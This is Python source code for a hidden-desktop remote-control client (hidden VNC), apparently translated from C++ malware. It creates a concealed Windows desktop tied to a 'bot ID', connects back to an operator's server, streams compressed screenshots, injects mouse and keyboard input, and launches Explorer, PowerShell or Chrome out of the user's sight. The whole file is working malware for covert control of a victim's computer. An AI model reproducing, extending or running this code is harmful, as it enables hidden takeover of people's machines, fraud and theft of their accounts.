import threading
import time
import signal
import sys
from win32con import GENERIC_ALL, DESKTOP_CREATEMENU, DESKTOP_CREATEWINDOW, DESKTOP_ENUMERATE, DESKTOP_HOOKCONTROL, \
    DESKTOP_JOURNALPLAYBACK, DESKTOP_JOURNALRECORD, DESKTOP_READOBJECTS, DESKTOP_SWITCHDESKTOP, DESKTOP_WRITEOBJECTS, \
    STANDARD_RIGHTS_REQUIRED
import win32api
import win32service
import win32gui
import win32con
from bitmap import *
from appinfo import *
from structures import *
import socket
import win32process
from win32api import GetCursorPos
import struct
import io
from win32com.shell import shellcon
import pyautogui
from virtualdesktop import _get_desk_pixels
from processmanage import *
from compress import compress

# Global flag to stop threads
stop_event = threading.Event()

g_host = "localhost"
g_port = 0
g_started = False

g_desktop_name = ""
g_h_desk = None
g_h_input_thread = None
g_h_desktop_thread = None
g_pixels = None
g_old_pixels = None
g_temp_pixels = None
g_applist = []
g_bmpInfo = None
g_index = 0
g_hWnd = None

from PIL import ImageGrab, Image
import numpy as np
import ctypes

# Assuming these are global variables from your C++ code (you may need to adjust)
gc_trans = (0, 0, 0)  # Transparent color (in RGB)

# Function to get desktop pixels
def get_desk_pixels(server_width, server_height):
    global g_pixels, g_old_pixels, g_bmpInfo

    image = _get_desk_pixels(server_width, server_height)

    g_bmpInfo.bmiHeader.biWidth = server_width
    g_bmpInfo.bmiHeader.biHeight = server_height

    with io.BytesIO() as output:
        image.save(output, format="BMP")
        bmp_bytes = output.getvalue()

    screen_pixels = np.frombuffer(bmp_bytes, dtype=np.uint8)

    if g_pixels is None:
        # First-time initialization
        g_pixels = np.copy(screen_pixels)
        g_old_pixels = np.copy(screen_pixels)
        return False  # No previous frame to compare against

    if g_old_pixels.shape != screen_pixels.shape:
        # If shape mismatch, reallocate and treat as changed
        g_pixels = np.copy(screen_pixels)
        g_old_pixels = np.copy(screen_pixels)
        return False

    # Compare with previous pixels
    is_same = np.array_equal(screen_pixels, g_old_pixels)

    # Update the buffers
    g_old_pixels[:] = g_pixels
    g_pixels[:] = screen_pixels

    return is_same

# Define your connection and input functions here
def connect_server():
    # Create and return a socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((g_host, g_port))  # Example address and port
    return s

def send_int(sock: socket.socket, i: int) -> int:
    # Pack the integer as 4 bytes (little-endian)
    packed = struct.pack('<I', i)  # Use '>I' for big-endian if needed
    try:
        return sock.send(packed)
    except socket.error as e:
        print(f"[-] Send failed: {e}")
        return 0
    
def send_data(s, data):
    s.sendall(data)

def receive_exact(s, size):
    data = b''
    while len(data) < size:
        try:
            chunk = s.recv(size - len(data))
            if not chunk:
                raise ConnectionAbortedError("Socket connection lost.")
            data += chunk
        except Exception as e:
            print(f"[!] receive_exact error: {e}")
            raise
    return data

def receive_data(s, buffer_size=1024):
    return s.recv(buffer_size)

# Function to open registry keys
def open_registry_key(path, access=win32con.KEY_READ):
    hkey = win32api.RegOpenKey(win32con.HKEY_LOCAL_MACHINE, path, 0, access)
    return hkey

def start_process(path, args=None):
    startup_info = win32process.STARTUPINFO()
    startup_info.dwFlags = win32con.STARTF_USESHOWWINDOW
    startup_info.wShowWindow = win32con.SW_SHOWNORMAL
    process_info = win32process.CreateProcess(path, args, None, None, False, 0, None, None, startup_info)
    return process_info

# Simulating the GetBotId function (returns a string representing the bot ID)
def get_bot_id():
    return "bot123"
    #return "Default"

# OpenDesktopA and CreateDesktopA using pywin32
def open_or_create_desktop(desktop_name):
    try:
        # Open an existing desktop
        g_h_desk = win32service.OpenDesktop(desktop_name, 0, True, GENERIC_ALL)
        print(f"[+] Opened existing desktop: {desktop_name}")
    except Exception as e:
        print(f"[!] Failed to open desktop {desktop_name}: {e}")
        # Create a new desktop if the previous one failed
        g_h_desk = win32service.CreateDesktop(desktop_name, 0, DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
                                          DESKTOP_ENUMERATE | DESKTOP_HOOKCONTROL | DESKTOP_JOURNALPLAYBACK |
                                          DESKTOP_JOURNALRECORD | DESKTOP_READOBJECTS | DESKTOP_SWITCHDESKTOP |
                                          DESKTOP_WRITEOBJECTS | STANDARD_RIGHTS_REQUIRED, None)
        print(f"[+] Created new desktop: {desktop_name}")
    
    return g_h_desk

# Mock-up for the Desktop thread
def desktop_thread():
    global g_index
    
    s = connect_server()

    gc_magik = b"MELTED\x00"  # Null-terminated byte string
    send_data(s, gc_magik)
    send_int(s, Connection.desktop)
    set_thread_desktop(g_h_desk)

    while not stop_event.is_set():
        try:
            # Receive width and height
            width = struct.unpack('<i', receive_exact(s, 4))[0]
            height = struct.unpack('<i', receive_exact(s, 4))[0]
            same = get_desk_pixels(width, height)

            if same:
                if send_int(s, 0) <= 0:
                    return
                continue

            if send_int(s, 1) <= 0:
                return

            #print(f"[+] Compressing {len(g_pixels.tobytes())} bytes (LZNT1)")
            compressed_data = compress(g_pixels.tobytes())
            #print(f"[+] Compressed {len(g_pixels.tobytes())} bytes (LZNT1)")

            # Get the screen's dimensions
            rect = win32gui.GetWindowRect(win32gui.GetDesktopWindow())
            rect_width = rect[2] - rect[0]
            rect_height = rect[3] - rect[1]

            # Send the screen info
            send_int(s, rect_width)
            send_int(s, rect_height)
            send_int(s, g_bmpInfo.bmiHeader.biWidth)
            send_int(s, g_bmpInfo.bmiHeader.biHeight)
            send_int(s, len(compressed_data))
            #print(f"[+] Sending {len(compressed_data)} bytes (LZNT1)")
            s.send(compressed_data)

            # Wait for a response
            response = struct.unpack('<i', receive_exact(s, 4))[0]
        except ConnectionAbortedError:
            print("[*] desktop_thread: Connection closed. Stopping.")
            break
        except Exception as e:
            print(f"[!] desktop_thread error: {e}")
            if stop_event.is_set():
                break

# Set the desktop for the current thread
def set_thread_desktop(desktop_handle):
    try:
        desktop_handle.SetThreadDesktop()
        print("[+] Set desktop for the current thread.")
    except Exception as e:
        print(f"[!] Failed to set desktop for the current thread: {e}")

# Helper function to get system directory
def get_system_folder():
    buf = ctypes.create_unicode_buffer(260)
    ctypes.windll.shell32.SHGetFolderPathW(None, shellcon.CSIDL_SYSTEM, None, 0, buf)
    return buf.value

# Simulating the InputThread function
def input_thread():
    global g_hWnd, g_applist
    s = connect_server()
    gc_magik = b"MELTED\x00"  # Null-terminated byte string
    send_data(s, gc_magik)  # Example data send
    send_int(s, Connection.input)
    response = receive_data(s)
    
    set_thread_desktop(g_h_desk)
    
    g_h_desktop_thread = threading.Thread(target=desktop_thread)
    g_h_desktop_thread.start()

    last_point = POINT(0, 0)
    point = POINT(0, 0)

    # Simulating receiving and handling messages
    # set_thread_desktop(g_h_desk)
    while not stop_event.is_set():
        try:
            mouseMsg = False

            msg = receive_exact(s, 4)  # Receive message size (example)
            w_param = receive_exact(s, 4)  # Additional parameters
            l_param = receive_exact(s, 4)
            
            if len(msg) < 4:
                print("[-] Received incomplete message header.")
                break
            if len(w_param) < 4:
                print("[-] Received incomplete message header.")
                break
            if len(l_param) < 4:
                print("[-] Received incomplete message header.")
                break

            msg = struct.unpack('<I', msg)[0]  # Little-endian unsigned int
            w_param = struct.unpack('<L', w_param)[0]  # unsigned 32-bit little-endian
            l_param = struct.unpack('<L', l_param)[0]
            
            if not msg:
                break

            if msg == WmStartApp.startExplorer:
                # Start Explorer
                desktopname = get_bot_id()
                start_explorer(desktopname)

            elif msg == WmStartApp.startRun:
                desktopname = get_bot_id()
                start_run(desktopname)

            elif msg == WmStartApp.startPowershell:
                desktopname = get_bot_id()
                start_powershell(desktopname)
            elif msg == WmStartApp.startChrome:
                # Start Chrome
                desktopname = get_bot_id()
                start_chrome(desktopname, g_applist)

            # Handle mouse/keyboard events
            elif msg == win32con.WM_KEYDOWN or msg == win32con.WM_CHAR or msg == win32con.WM_KEYUP:
                point = POINT(last_point.x, last_point.y)
                g_hWnd = win32gui.WindowFromPoint((point.x, point.y))

            #elif msg == win32con.WM_LBUTTONDOWN:
            #    # Simulate mouse down event
            #    x, y = GetCursorPos()
            #    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, x, y, 0, 0)
            else:
                mouseMsg = True
                l_param = l_param & 0xFFFFFFFF
                x = win32api.LOWORD(l_param) if win32api.LOWORD(l_param) < 0x8000 else win32api.LOWORD(l_param) - 0x10000
                y = win32api.HIWORD(l_param) if win32api.HIWORD(l_param) < 0x8000 else win32api.HIWORD(l_param) - 0x10000
                point = POINT(x, y)
                last_point = point
                g_hWnd = win32gui.WindowFromPoint((point.x, point.y))

                if msg == win32con.WM_LBUTTONUP:
                    l_result = win32gui.SendMessage(g_hWnd, win32con.WM_NCHITTEST, 0, l_param)

                    if l_result == win32con.HTTRANSPARENT:
                        style = win32gui.GetWindowLong(g_hWnd, win32con.GWL_STYLE)
                        win32gui.SetWindowLong(g_hWnd, win32con.GWL_STYLE, style | win32con.WS_DISABLED)
                        l_result = win32gui.SendMessage(g_hWnd, win32con.WM_NCHITTEST, 0, l_param)

                    elif l_result == win32con.HTCLOSE:
                        win32gui.PostMessage(g_hWnd, win32con.WM_CLOSE, 0, 0)

                    elif l_result == win32con.HTMINBUTTON:
                        win32gui.PostMessage(g_hWnd, win32con.WM_SYSCOMMAND, win32con.SC_MINIMIZE, 0)

                    elif l_result == win32con.HTMAXBUTTON:
                        wp = WINDOWPLACEMENT()
                        wp.length = ctypes.sizeof(WINDOWPLACEMENT)
                        ctypes.windll.user32.GetWindowPlacement(g_hWnd, ctypes.byref(wp))

                        if wp.flags & win32con.SW_SHOWMAXIMIZED:
                            win32gui.PostMessage(g_hWnd, win32con.WM_SYSCOMMAND, win32con.SC_RESTORE, 0)
                        else:
                            win32gui.PostMessage(g_hWnd, win32con.WM_SYSCOMMAND, win32con.SC_MAXIMIZE, 0)

                elif msg == win32con.WM_LBUTTONDOWN:
                    h_start_button = win32gui.FindWindow("Button", None)
                    rect = RECT()
                    ctypes.windll.user32.GetWindowRect(h_start_button, ctypes.byref(rect))

                    if ctypes.windll.user32.PtInRect(ctypes.byref(rect), point):
                        win32gui.PostMessage(h_start_button, win32con.BM_CLICK, 0, 0)
                        print("button click")
                    else:
                        # MAX_PATH = 260

                        window_class = ctypes.create_string_buffer(260)
                        ctypes.windll.user32.RealGetWindowClassA(g_hWnd, window_class, 260)

                        if window_class.value.decode() == "#32768":  # Assuming Strs.hd1 is defined elsewhere
                            h_menu = win32gui.SendMessage(g_hWnd, 0x01E1, 0, 0)  # MN_GETHMENU = 0x01E1
                            item_pos = ctypes.windll.user32.MenuItemFromPoint(None, h_menu, point)
                            item_id = win32gui.GetMenuItemID(h_menu, item_pos)
                            win32gui.PostMessage(g_hWnd, 0x01E5, item_pos, 0)  # 0x1E5 is a custom message in your case
                            win32gui.PostMessage(g_hWnd, win32con.WM_KEYDOWN, win32con.VK_RETURN, 0)

                elif msg == win32con.WM_MOUSEMOVE:
                    try:
                        g_hWnd = win32gui.GetAncestor(g_hWnd, win32con.GA_ROOT)
                        ctypes.windll.user32.ScreenToClient(g_hWnd, ctypes.byref(point))
                        l_param = win32api.MAKELONG(point.x, point.y)
                        win32gui.PostMessage(g_hWnd, msg, w_param, l_param)
                    except Exception as e:
                        print(f"An error occurred: {e}")

            try:
                while True:
                    curr_hWnd = g_hWnd
                    win32gui.ScreenToClient(curr_hWnd, (point.x, point.y))
                    new_hWnd = win32gui.ChildWindowFromPoint(curr_hWnd, (point.x, point.y))

                    if not new_hWnd or new_hWnd == g_hWnd:
                        break
                    g_hWnd = new_hWnd
            except Exception as e:
                print(f"An error occurred: {e}")
                    
            if mouseMsg:
                l_param = win32api.MAKELONG(point.x, point.y)
            
            #modify if chrome window, get top chrome handle
            try:
                class_name = win32gui.GetClassName(g_hWnd)
                caption = win32gui.GetWindowText(g_hWnd)
                if class_name == "Chrome_RenderWidgetHostHWND":
                    g_hWnd = win32gui.GetParent(g_hWnd)
            except Exception as e:
                print(f"An error occurred: {e}")


            win32gui.PostMessage(g_hWnd, msg, w_param, l_param)
        except ConnectionAbortedError:
            print("[*] input_thread: Connection closed. Stopping.")
            break
        except Exception as e:
            print(f"[!] input_thread error: {e}")
            if stop_event.is_set():
                break
    s.close()

# Initialize the BITMAPINFO structure
def initialize_bitmap_info():
    bmp_info = BITMAPINFO()

    # Initialize the bmiHeader fields, equivalent to Memset
    bmp_info.bmiHeader.biSize = ctypes.sizeof(bmp_info.bmiHeader)
    bmp_info.bmiHeader.biPlanes = 1
    bmp_info.bmiHeader.biBitCount = 24
    bmp_info.bmiHeader.biCompression = BI_RGB
    bmp_info.bmiHeader.biClrUsed = 0

    return bmp_info

# MainThread function (the equivalent of your C++ MainThread)
def main_thread():
    global g_started, g_desktop_name, g_h_desk, g_h_input_thread, g_pixels, g_old_pixels, g_temp_pixels, g_bmpInfo, g_applist

    # Simulating pMemset and initialization
    g_desktop_name = get_bot_id()

    # Setting up the bitmap info (simulating pMemset of g_bmpInfo)
    g_bmpInfo = initialize_bitmap_info()

    # Open or create the desktop (equivalent to OpenDesktopA or CreateDesktopA)
    g_h_desk = open_or_create_desktop(g_desktop_name)

    # Set the desktop for the current thread (equivalent to SetThreadDesktop)
    set_thread_desktop(g_h_desk)

    # Get the list of installed apps (placeholder function)
    g_applist = get_installation_apps_list()

    # Simulate creating a thread for input processing
    g_h_input_thread = threading.Thread(target=input_thread)
    g_h_input_thread.start()


    # Keep main thread alive until Ctrl+C
    while not stop_event.is_set():
        time.sleep(0.5)

    g_h_input_thread.join()
    if g_h_desktop_thread:
        g_h_desktop_thread.join()
    
    g_pixels = None
    g_old_pixels = None
    g_temp_pixels = None

    g_started = False
    print("[MainThread] Process complete and cleaned up.")

def start_hidden_desktop(host, port):
    global g_started, g_host, g_port

    g_host = host
    g_port = port
    g_started = True

    # Start a new thread running `main_thread`
    thread = threading.Thread(target=main_thread)
    thread.start()
    return thread

def signal_handler(sig, frame):
    print("\n[!] Ctrl+C detected. Shutting down...")
    stop_event.set()

    # Wait a moment for threads to shut down cleanly
    time.sleep(1)
    sys.exit(0)

def main():
    host = input("[!] Server IP: ")
    port = int(input("[!] Server Port: "))

    hThread = start_hidden_desktop(host, port)
    print("[+] Waiting for thread to finish or timeout...")

    # Set up signal handler
    signal.signal(signal.SIGINT, signal_handler)

    # Keep main thread alive until Ctrl+C
    try:
        while not stop_event.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[!] KeyboardInterrupt caught in main. Stopping...")
        stop_event.set()

    hThread.join()

if __name__ == "__main__":
    main()
